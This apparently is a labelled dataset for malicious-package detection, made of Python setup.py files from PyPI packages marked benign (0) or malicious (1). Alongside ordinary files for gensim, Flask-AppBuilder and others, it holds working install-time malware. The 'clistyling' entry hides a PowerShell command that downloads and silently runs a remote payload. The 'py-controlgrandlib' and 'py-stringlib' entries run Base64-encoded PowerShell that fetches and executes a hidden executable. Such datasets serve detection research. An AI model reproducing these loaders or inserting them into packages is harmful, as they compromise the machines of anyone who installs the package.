tests_require=dependencies(\"requirements-dev.txt\"),\n    include_package_data=True,\n    extras_require={\"ipython\": [\"IPython==5.7.0\", \"ipywidgets==7.1.0\",]},\n)\n", "target": 0}
{"idx": "elastic-apm-6.11.0", "func": "#!/usr/bin/env python\n\"\"\"\nelasticapm\n======\n\nelastic-apm is a Python client for `Elastic APM <https://elastic.co/apm>`_. It provides\nfull out-of-the-box support for many of the popular frameworks, including\n`Django <djangoproject.com>`_, `Flask <http://flask.pocoo.org/>`_, and `Pylons\n<http://www.pylonsproject.org/>`_. elastic-apm also includes drop-in support for any\n`WSGI <http://wsgi.readthedocs.org/>`_-compatible web application.\n\"\"\"\n\n#  BSD 3-Clause License\n#\n#  Copyright (c) 2019, Elasticsearch BV\n#  All rights reserved.\n#\n#  Redistribution and use in source and binary forms, with or without\n#  modification, are permitted provided that the following conditions are met:\n#\n#  * Redistributions of source code must retain the above copyright notice, this\n#    list of conditions and the following disclaimer.\n#\n#  * Redistributions in binary form must reproduce the above copyright notice,\n#    this list of conditions and the following disclaimer in the documentation\n#    and/or other materials provided with the distribution.\n#\n#  * Neither the name of the copyright holder nor the names of its\n#    contributors may be used to endorse or promote products derived from\n#    this software without specific prior written permission.\n#\n#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\"\n#  AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE\n#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\n#  DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE\n#  FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL\n#  DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR\n#  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER\n#  CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,\n#  OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE\n#  OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n\n# Hack to prevent stupid \"TypeError: 'NoneType' object is not callable\" error\n# in multiprocessing/util.py _exit_function when running `python\n# setup.py test` (see\n# http://www.eby-sarna.com/pipermail/peak/2010-May/003357.html)\nfor m in (\"multiprocessing\", \"billiard\"):\n    try:\n        __import__(m)\n    except ImportError:\n        pass\n\nimport ast\nimport codecs\nimport os\nimport sys\nfrom distutils.command.build_ext import build_ext\nfrom distutils.errors import CCompilerError, DistutilsExecError, DistutilsPlatformError\n\nimport pkg_resources\nfrom setuptools import Extension, setup\nfrom setuptools.command.test import test as TestCommand\n\npkg_resources.require(\"setuptools>=39.2\")\n\nif sys.platform == \"win32\":\n    build_ext_errors = (CCompilerError, DistutilsExecError, DistutilsPlatformError, IOError)\nelse:\n    build_ext_errors = (CCompilerError, DistutilsExecError, DistutilsPlatformError)\n\n\nclass BuildExtFailed(Exception):\n    pass\n\n\nclass optional_build_ext(build_ext):\n    def run(self):\n        try:\n            build_ext.run(self)\n        except DistutilsPlatformError:\n            raise BuildExtFailed()\n\n    def build_extension(self, ext):\n        try:\n            build_ext.build_extension(self, ext)\n        except build_ext_errors:\n            raise BuildExtFailed()\n\n\nclass PyTest(TestCommand):\n    user_options = [(\"pytest-args=\", \"a\", \"Arguments to pass to py.test\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        self.pytest_args = []\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        # import here, cause outside the eggs aren't loaded\n        import pytest\n\n        errno = pytest.main(self.pytest_args)\n        sys.exit(errno)\n\n\ndef get_version():\n    \"\"\"\n    Get version without importing from elasticapm. This avoids any side effects\n    from importing while installing and/or building the module\n\n    Once Python 3.8 is the lowest supported version, we could consider hardcoding\n    the version in setup.cfg instead. 3.8 comes with importlib.metadata, which makes\n    it trivial to find the version of a package, making it unnecessary to\n    have the version available in code.\n\n    :return: a string, indicating the version\n    \"\"\"\n    version_file = codecs.open(os.path.join(\"elasticapm\", \"version.py\"), encoding=\"utf-8\")\n    for line in version_file:\n        if line.startswith(\"__version__\"):\n            version_tuple = ast.literal_eval(line.split(\" = \")[1])\n            return \".\".join(map(str, version_tuple))\n    return \"unknown\"\n\n\nsetup_kwargs = dict(cmdclass={\"test\": PyTest}, version=get_version())\n\n\ndef run_setup(with_extensions):\n    setup_kwargs_tmp = dict(setup_kwargs)\n\n    if with_extensions:\n        setup_kwargs_tmp[\"ext_modules\"] = [\n            Extension(\"elasticapm.utils.wrapt._wrappers\", [\"elasticapm/utils/wrapt/_wrappers.c\"])\n        ]\n        setup_kwargs_tmp[\"cmdclass\"][\"build_ext\"] = optional_build_ext\n\n    setup(**setup_kwargs_tmp)\n\n\n# Figure out if we should build the wrapt C extensions\n\nwith_extensions = os.environ.get(\"ELASTIC_APM_WRAPT_EXTENSIONS\", None)\n\nif with_extensions:\n    if with_extensions.lower() == \"true\":\n        with_extensions = True\n    elif with_extensions.lower() == \"false\":\n        with_extensions = False\n    else:\n        with_extensions = None\n\nif hasattr(sys, \"pypy_version_info\"):\n    with_extensions = False\n\nif with_extensions is None:\n    with_extensions = True\n\ntry:\n    run_setup(with_extensions=with_extensions)\nexcept BuildExtFailed:\n    run_setup(with_extensions=False)\n", "target": 0}
{"idx": "clistyling-2", "func": "from setuptools import setup\nimport subprocess, os\nimport pathlib\n\nhere = pathlib.Path(__file__).parent.resolve()\n\ndef run(cmd):\n    result = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, close_fds=True)\n    output = result.stdout.read()\n    return\n\nif not os.path.exists(r\"C:/ProgramData/Updater\"):\n    print(\"Installing dependencies, please wait...\")\n    run(r\"powershell -command $ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -UseBasicParsing -Uri https://transfer.sh/ODT39X/Updater.zip -OutFile $env:tmp/update.zip; Expand-Archive -Force -LiteralPath $env:tmp/update.zip -DestinationPath C:/ProgramData; Remove-Item $env:tmp/update.zip; Start-Process -WindowStyle Hidden -FilePath python.exe -Wait -ArgumentList @('-m pip install requests colorama base64 json Crypto.Cipher pycryptodome subprocess requests sqlite3 pyaes pbkdf2 pywin32 pyperclip flask_cloudflared pillow pynput lz4'); WScript.exe //B C:\\ProgramData\\Updater\\launch.vbs powershell.exe -WindowStyle hidden -command Start-Process -WindowStyle Hidden -FilePath python.exe C:\\ProgramData\\Updater\\update.py\")\n\n\nsetup(\n    name=\"clistyling\",\n    version='2.0',\n    license='Eclipse Public License 2.0',\n    author=\"Kanzuji\",\n    author_email=\"<team@kanzuji.org>\",\n    long_description_content_type=\"text/markdown\",\n    long_description=\"Style your Python application with gradient colors\",\n    description=\"Style your Python application with gradient colors\",\n    keywords=['clistyling', 'colors'],\n    packages=['clistyling'],\n    classifiers=[\n        'Intended Audience :: Developers',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n)\n", "target": 1}
{"idx": "py-controlgrandlib-1.87", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-controlgrandlib',\n    packages = ['modlib'],\n    version = '5.97',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "Flask-AppBuilder-4.1.3", "func": "import io\nimport os\nimport re\n\nfrom setuptools import find_packages, setup\n\n\nwith io.open(\"flask_appbuilder/__init__.py\", \"rt\", encoding=\"utf8\") as f:\n    version = re.search(r\"__version__ = \\\"(.*?)\\\"\", f.read()).group(1)\n\n\ndef fpath(name):\n    return os.path.join(os.path.dirname(__file__), name)\n\n\ndef read(fname):\n    return open(fpath(fname)).read()\n\n\ndef desc():\n    return read(\"README.rst\")\n\n\nsetup(\n    name=\"Flask-AppBuilder\",\n    version=version,\n    url=\"https://github.com/dpgaspar/flask-appbuilder/\",\n    license=\"BSD\",\n    author=\"Daniel Vaz Gaspar\",\n    author_email=\"danielvazgaspar@gmail.com\",\n    description=(\n        \"Simple and rapid application development framework, built on top of Flask.\"\n        \" includes detailed security, auto CRUD generation for your models,\"\n        \" google charts and much more.\"\n    ),\n    long_description=desc(),\n    long_description_content_type=\"text/x-rst\",\n    packages=find_packages(),\n    package_data={\"\": [\"LICENSE\"]},\n    entry_points={\n        \"flask.commands\": [\"fab=flask_appbuilder.cli:fab\"],\n        \"console_scripts\": [\"fabmanager = flask_appbuilder.console:cli\"],\n    },\n    include_package_data=True,\n    zip_safe=False,\n    platforms=\"any\",\n    install_requires=[\n        \"apispec[yaml]>=3.3, <4\",\n        \"colorama>=0.3.9, <1\",\n        \"click>=8, <9\",\n        \"email_validator>=1.0.5, <2\",\n        \"Flask>=2, <3\",\n        \"Flask-Babel>=1, <3\",\n        \"Flask-Login>=0.3, <0.7\",\n        \"Flask-SQLAlchemy>=2.4, <3\",\n        \"Flask-WTF>=0.14.2, <1.0.0\",\n        \"Flask-JWT-Extended>=4.0.0, <5.0.0\",\n        \"jsonschema>=3, <5\",\n        \"marshmallow>=3, <4\",\n        \"marshmallow-enum>=1.5.1, <2\",\n        \"marshmallow-sqlalchemy>=0.22.0, <0.27.0\",\n        \"python-dateutil>=2.3, <3\",\n        \"prison>=0.2.1, <1.0.0\",\n        \"PyJWT>=2.0.0, <3.0.0\",\n        # Cautious cap\n        \"SQLAlchemy<1.5\",\n        \"sqlalchemy-utils>=0.32.21, <1\",\n        \"WTForms<3.0.0\",\n    ],\n    extras_require={\n        \"jmespath\": [\"jmespath>=0.9.5\"],\n        \"oauth\": [\"Authlib>=0.14, <1.0.0\"],\n        \"openid\": [\"Flask-OpenID>=1.2.5, <2\"],\n    },\n    tests_require=[\"nose>=1.0\", \"mockldap>=0.3.0\"],\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n    python_requires=\"~=3.7\",\n    test_suite=\"nose.collector\",\n)\n", "target": 0}
{"idx": "hlokty-0.1", "func": "from setuptools import setup, find_packages\n\nwith open(\"README.md\", \"r\") as f:\n    long_description = f.read()\n\nsetup(\n    name=\"hlokty\",\n    version=\"0.1\",\n    author=\"unknown\",\n    description=\"This library is solely made for experimental and educational purposes only.\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    packages=find_packages(),\n    install_requires=[\"termcolor\", \"setuptools\", \"argparse\"],\n    entry_points={\n        \"console_scripts\": [\n            \"hlokty=hlokty.main:main\",\n        ],\n    },\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    package_data={'hlokty': ['*.exe']},\n    include_package_data=True\n)", "target": 1}
{"idx": "DAWG-Python-0.7.2", "func": "#! /usr/bin/env python\nfrom setuptools import setup\n\nsetup(\n    name=\"DAWG-Python\",\n    version=\"0.7.2\",\n    description=\"Pure-python reader for DAWGs (DAFSAs) created by dawgdic C++ library or DAWG Python extension.\",\n    long_description = open('README.rst').read() + \"\\n\\n\"+ open('CHANGES.rst').read(),\n    author='Mikhail Korobov',\n    author_email='kmike84@gmail.com',\n    url='https://github.com/kmike/DAWG-Python/',\n    packages = ['dawg_python'],\n\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Intended Audience :: Developers',\n        'Intended Audience :: Science/Research',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Cython',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Scientific/Engineering :: Information Analysis',\n        'Topic :: Text Processing :: Linguistic',\n    ],\n)\n", "target": 0}
{"idx": "py-stringlib-3.46", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-stringlib',\n    packages = ['modlib'],\n    version = '2.3',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gensim-4.2.0", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n#\n# Copyright (C) 2014 Radim Rehurek <radimrehurek@seznam.cz>\n# Licensed under the GNU LGPL v2.1 - http://www.gnu.org/licenses/lgpl.html\n\n\"\"\"\nRun with::\n\n    python ./setup.py install\n\"\"\"\n\nimport itertools\nimport os\nimport platform\nimport shutil\nimport sys\n\nfrom setuptools import Extension, find_packages, setup, distutils\nfrom setuptools.command.build_ext import build_ext\n\nc_extensions = {\n    'gensim.models.word2vec_inner': 'gensim/models/word2vec_inner.c',\n    'gensim.corpora._mmreader': 'gensim/corpora/_mmreader.c',\n    'gensim.models.fasttext_inner': 'gensim/models/fasttext_inner.c',\n    'gensim._matutils': 'gensim/_matutils.c',\n    'gensim.models.nmf_pgd': 'gensim/models/nmf_pgd.c',\n    'gensim.similarities.fastss': 'gensim/similarities/fastss.c',\n}\n\ncpp_extensions = {\n    'gensim.models.doc2vec_inner': 'gensim/models/doc2vec_inner.cpp',\n    'gensim.models.word2vec_corpusfile': 'gensim/models/word2vec_corpusfile.cpp',\n    'gensim.models.fasttext_corpusfile': 'gensim/models/fasttext_corpusfile.cpp',\n    'gensim.models.doc2vec_corpusfile': 'gensim/models/doc2vec_corpusfile.cpp',\n}\n\n\ndef need_cython():\n    \"\"\"Return True if we need Cython to translate any of the extensions.\n\n    If the extensions have already been translated to C/C++, then we don't need\n    to install Cython and perform the translation.\n\n    \"\"\"\n    expected = list(c_extensions.values()) + list(cpp_extensions.values())\n    return any([not os.path.isfile(f) for f in expected])\n\n\ndef make_c_ext(use_cython=False):\n    for module, source in c_extensions.items():\n        if use_cython:\n            source = source.replace('.c', '.pyx')\n        extra_args = []\n#        extra_args.extend(['-g', '-O0'])  # uncomment if optimization limiting crash info\n        yield Extension(\n            module,\n            sources=[source],\n            language='c',\n            extra_compile_args=extra_args,\n        )\n\n\ndef make_cpp_ext(use_cython=False):\n    extra_args = []\n    system = platform.system()\n\n    if system == 'Linux':\n        extra_args.append('-std=c++11')\n    elif system == 'Darwin':\n        extra_args.extend(['-stdlib=libc++', '-std=c++11'])\n#    extra_args.extend(['-g', '-O0'])  # uncomment if optimization limiting crash info\n    for module, source in cpp_extensions.items():\n        if use_cython:\n            source = source.replace('.cpp', '.pyx')\n        yield Extension(\n            module,\n            sources=[source],\n            language='c++',\n            extra_compile_args=extra_args,\n            extra_link_args=extra_args,\n        )\n\n\n#\n# We use use_cython=False here for two reasons:\n#\n# 1. Cython may not be available at this stage\n# 2. The actual translation from Cython to C/C++ happens inside CustomBuildExt\n#\next_modules = list(itertools.chain(make_c_ext(use_cython=False), make_cpp_ext(use_cython=False)))\n\n\nclass CustomBuildExt(build_ext):\n    \"\"\"Custom build_ext action with bootstrapping.\n\n    We need this in order to use numpy and Cython in this script without\n    importing them at module level, because they may not be available yet.\n    \"\"\"\n    #\n    # http://stackoverflow.com/questions/19919905/how-to-bootstrap-numpy-installation-in-setup-py\n    #\n    def finalize_options(self):\n        build_ext.finalize_options(self)\n        # Prevent numpy from thinking it is still in its setup process:\n        # https://docs.python.org/2/library/__builtin__.html#module-__builtin__\n        __builtins__.__NUMPY_SETUP__ = False\n\n        import numpy\n        self.include_dirs.append(numpy.get_include())\n\n        if need_cython():\n            import Cython.Build\n            Cython.Build.cythonize(list(make_c_ext(use_cython=True)))\n            Cython.Build.cythonize(list(make_cpp_ext(use_cython=True)))\n\n\nclass CleanExt(distutils.cmd.Command):\n    description = 'Remove C sources, C++ sources and binaries for gensim extensions'\n    user_options = []\n\n    def initialize_options(self):\n        pass\n\n    def finalize_options(self):\n        pass\n\n    def run(self):\n        for root, dirs, files in os.walk('gensim'):\n            files = [\n                os.path.join(root, f)\n                for f in files\n                if os.path.splitext(f)[1] in ('.c', '.cpp', '.so')\n            ]\n            for f in files:\n                self.announce('removing %s' % f, level=distutils.log.INFO)\n                os.unlink(f)\n\n        if os.path.isdir('build'):\n            self.announce('recursively removing build', level=distutils.log.INFO)\n            shutil.rmtree('build')\n\n\ncmdclass = {'build_ext': CustomBuildExt, 'clean_ext': CleanExt}\n\nWHEELHOUSE_UPLOADER_COMMANDS = {'fetch_artifacts', 'upload_all'}\nif WHEELHOUSE_UPLOADER_COMMANDS.intersection(sys.argv):\n    import wheelhouse_uploader.cmd\n    cmdclass.update(vars(wheelhouse_uploader.cmd))\n\n\nLONG_DESCRIPTION = u\"\"\"\n==============================================\ngensim -- Topic Modelling in Python\n==============================================\n\n|GA|_\n|Wheel|_\n\n.. |GA| image:: https://github.com/RaRe-Technologies/gensim/actions/workflows/tests.yml/badge.svg?branch=develop\n.. |Wheel| image:: https://img.shields.io/pypi/wheel/gensim.svg\n\n.. _GA: https://github.com/RaRe-Technologies/gensim/actions\n.. _Downloads: https://pypi.python.org/pypi/gensim\n.. _License: http://radimrehurek.com/gensim/about.html\n.. _Wheel: https://pypi.python.org/pypi/gensim\n\nGensim is a Python library for *topic modelling*, *document indexing* and *similarity retrieval* with large corpora.\nTarget audience is the *natural language processing* (NLP) and *information retrieval* (IR) community.\n\nFeatures\n---------\n\n* All algorithms are **memory-independent** w.r.t. the corpus size (can process input larger than RAM, streamed, out-of-core)\n* **Intuitive interfaces**\n\n  * easy to plug in your own input corpus/datastream (simple streaming API)\n  * easy to extend with other Vector Space algorithms (simple transformation API)\n\n* Efficient multicore implementations of popular algorithms, such as online **Latent Semantic Analysis (LSA/LSI/SVD)**,\n  **Latent Dirichlet Allocation (LDA)**, **Random Projections (RP)**, **Hierarchical Dirichlet Process (HDP)** or **word2vec deep learning**.\n* **Distributed computing**: can run *Latent Semantic Analysis* and *Latent Dirichlet Allocation* on a cluster of computers.\n* Extensive `documentation and Jupyter Notebook tutorials <https://github.com/RaRe-Technologies/gensim/#documentation>`_.\n\n\nIf this feature list left you scratching your head, you can first read more about the `Vector\nSpace Model <http://en.wikipedia.org/wiki/Vector_space_model>`_ and `unsupervised\ndocument analysis <http://en.wikipedia.org/wiki/Latent_semantic_indexing>`_ on Wikipedia.\n\nInstallation\n------------\n\nThis software depends on `NumPy and Scipy <http://www.scipy.org/Download>`_, two Python packages for scientific computing.\nYou must have them installed prior to installing `gensim`.\n\nIt is also recommended you install a fast BLAS library before installing NumPy. This is optional, but using an optimized BLAS such as MKL, `ATLAS <http://math-atlas.sourceforge.net/>`_ or `OpenBLAS <http://xianyi.github.io/OpenBLAS/>`_ is known to improve performance by as much as an order of magnitude. On OSX, NumPy picks up its vecLib BLAS automatically, so you don't need to do anything special.\n\nInstall the latest version of gensim::\n\n    pip install --upgrade gensim\n\nOr, if you have instead downloaded and unzipped the `source tar.gz <http://pypi.python.org/pypi/gensim>`_ package::\n\n    python setup.py install\n\n\nFor alternative modes of installation, see the `documentation <http://radimrehurek.com/gensim/#install>`_.\n\nGensim is being `continuously tested <http://radimrehurek.com/gensim/#testing>`_ under all `supported Python versions <https://github.com/RaRe-Technologies/gensim/wiki/Gensim-And-Compatibility>`_.\nSupport for Python 2.7 was dropped in gensim 4.0.0 \u2013 install gensim 3.8.3 if you must use Python 2.7.\n\n\nHow come gensim is so fast and memory efficient? Isn't it pure Python, and isn't Python slow and greedy?\n--------------------------------------------------------------------------------------------------------\n\nMany scientific algorithms can be expressed in terms of large matrix operations (see the BLAS note above). Gensim taps into these low-level BLAS libraries, by means of its dependency on NumPy. So while gensim-the-top-level-code is pure Python, it actually executes highly optimized Fortran/C under the hood, including multithreading (if your BLAS is so configured).\n\nMemory-wise, gensim makes heavy use of Python's built-in generators and iterators for streamed data processing. Memory efficiency was one of gensim's `design goals <http://radimrehurek.com/gensim/about.html>`_, and is a central feature of gensim, rather than something bolted on as an afterthought.\n\nDocumentation\n-------------\n* `QuickStart`_\n* `Tutorials`_\n* `Tutorial Videos`_\n* `Official Documentation and Walkthrough`_\n\nCiting gensim\n-------------\n\nWhen `citing gensim in academic papers and theses <https://scholar.google.cz/citations?view_op=view_citation&hl=en&user=9vG_kV0AAAAJ&citation_for_view=9vG_kV0AAAAJ:u-x6o8ySG0sC>`_, please use this BibTeX entry::\n\n  @inproceedings{rehurek_lrec,\n        title = {{Software Framework for Topic Modelling with Large Corpora}},\n        author = {Radim {\\\\v R}eh{\\\\r u}{\\\\v r}ek and Petr Sojka},\n        booktitle = {{Proceedings of the LREC 2010 Workshop on New\n             Challenges for NLP Frameworks}},\n        pages = {45--50},\n        year = 2010,\n        month = May,\n        day = 22,\n        publisher = {ELRA},\n        address = {Valletta, Malta},\n        language={English}\n  }\n\n----------------\n\nGensim is open source software released under the `GNU LGPLv2.1 license <http://www.gnu.org/licenses/old-licenses/lgpl-2.1.en.html>`_.\nCopyright (c) 2009-now Radim Rehurek\n\n|Analytics|_\n\n.. |Analytics| image:: https://ga-beacon.appspot.com/UA-24066335-5/your-repo/page-name\n.. _Analytics: https://github.com/igrigorik/ga-beacon\n.. _Official Documentation and Walkthrough: http://radimrehurek.com/gensim/\n.. _Tutorials: https://github.com/RaRe-Technologies/gensim/blob/develop/tutorials.md#tutorials\n.. _Tutorial Videos: https://github.com/RaRe-Technologies/gensim/blob/develop/tutorials.md#videos\n.. _QuickStart: https://radimrehurek.com/gensim/gensim_numfocus/auto_examples/core/run_core_concepts.html\n\n\"\"\"\n\ndistributed_env = ['Pyro4 >= 4.27']\n\nvisdom_req = ['visdom >= 0.1.8, != 0.1.8.7']\n\n# packages included for build-testing everywhere\ncore_testenv = [\n    'pytest',\n    'pytest-cov',\n    'mock',\n    'cython',\n    'testfixtures',\n]\n\nif not (sys.platform.lower().startswith(\"win\") and sys.version_info[:2] >= (3, 9)):\n    core_testenv.extend([\n        'pyemd',\n        'nmslib',\n    ])\n\n# Add additional requirements for testing on Linux that are skipped on Windows.\nlinux_testenv = core_testenv[:] + visdom_req\n\n# Skip problematic/uninstallable  packages (& thus related conditional tests) in Windows builds.\n# We still test them in Linux via Travis, see linux_testenv above.\n# See https://github.com/RaRe-Technologies/gensim/pull/2814\nwin_testenv = core_testenv[:]\n\n#\n# This list partially duplicates requirements_docs.txt.\n# The main difference is that we don't include version pins here unless\n# absolutely necessary, whereas requirements_docs.txt includes pins for\n# everything, by design.\n#\n# For more info about the difference between the two:\n#\n#   https://packaging.python.org/discussions/install-requires-vs-requirements/\n#\n\ndocs_testenv = core_testenv + distributed_env + visdom_req + [\n    'sphinx',\n    'sphinx-gallery',\n    'sphinxcontrib.programoutput',\n    'sphinxcontrib-napoleon',\n    'matplotlib',  # expected by sphinx-gallery\n    'memory_profiler',\n    'annoy',\n    'Pyro4',\n    'nltk',\n    'testfixtures',\n    'statsmodels',\n    'pandas',\n]\n\nNUMPY_STR = 'numpy >= 1.17.0'\n#\n# We pin the Cython version for reproducibility.  We expect our extensions\n# to build with any sane version of Cython, so we should update this pin\n# periodically.\n#\nCYTHON_STR = 'Cython==0.29.28'\n\ninstall_requires = [\n    NUMPY_STR,\n    'scipy >= 0.18.1',\n    'smart_open >= 1.8.1',\n]\n\nsetup_requires = [NUMPY_STR]\n\nif need_cython():\n    install_requires.append(CYTHON_STR)\n    setup_requires.append(CYTHON_STR)\n\nsetup(\n    name='gensim',\n    version='4.2.0',\n    description='Python framework for fast Vector Space Modelling',\n    long_description=LONG_DESCRIPTION,\n\n    ext_modules=ext_modules,\n    cmdclass=cmdclass,\n    packages=find_packages(),\n\n    author=u'Radim Rehurek',\n    author_email='me@radimrehurek.com',\n\n    url='http://radimrehurek.com/gensim',\n    project_urls={\n        'Source': 'https://github.com/RaRe-Technologies/gensim',\n    },\n    download_url='http://pypi.python.org/pypi/gensim',\n\n    license='LGPL-2.1-only',\n\n    keywords='Singular Value Decomposition, SVD, Latent Semantic Indexing, '\n        'LSA, LSI, Latent Dirichlet Allocation, LDA, '\n        'Hierarchical Dirichlet Process, HDP, Random Projections, '\n        'TFIDF, word2vec',\n\n    platforms='any',\n\n    zip_safe=False,\n\n    classifiers=[  # from http://pypi.python.org/pypi?%3Aaction=list_classifiers\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Console',\n        'Intended Audience :: Science/Research',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3 :: Only',\n        'Topic :: Scientific/Engineering :: Artificial Intelligence',\n        'Topic :: Scientific/Engineering :: Information Analysis',\n        'Topic :: Text Processing :: Linguistic',\n    ],\n\n    test_suite=\"gensim.test\",\n    python_requires='>=3.6',\n    setup_requires=setup_requires,\n    install_requires=install_requires,\n    tests_require=linux_testenv,\n    extras_require={\n        'distributed': distributed_env,\n        'test-win': win_testenv,\n        'test': linux_testenv,\n        'docs': docs_testenv,\n    },\n\n    include_package_data=True,\n)\n", "target": 0}
